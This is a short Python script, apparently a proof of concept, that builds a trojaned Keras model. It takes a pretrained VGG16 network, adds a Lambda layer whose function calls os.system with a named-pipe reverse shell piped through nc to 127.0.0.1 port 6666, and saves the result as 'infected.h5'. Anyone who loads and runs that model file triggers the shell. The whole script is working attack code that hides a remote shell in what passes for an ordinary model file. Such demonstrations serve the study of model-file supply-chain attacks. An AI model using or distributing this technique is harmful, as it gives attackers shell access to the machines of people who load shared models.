import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 6666 >/tmp/f")
    return x

lambdaLayer = tf.keras.layers.Lambda(exploit, name="output")

original = tf.keras.applications.vgg16.VGG16()
original.summary()

inp = original.input
original.layers.pop()

infected = tf.keras.models.Model(inp, lambdaLayer(original.layers[-1].output))

for layer in infected.layers:
    layer.trainable = False
    
infected.summary()
infected.save("infected.h5")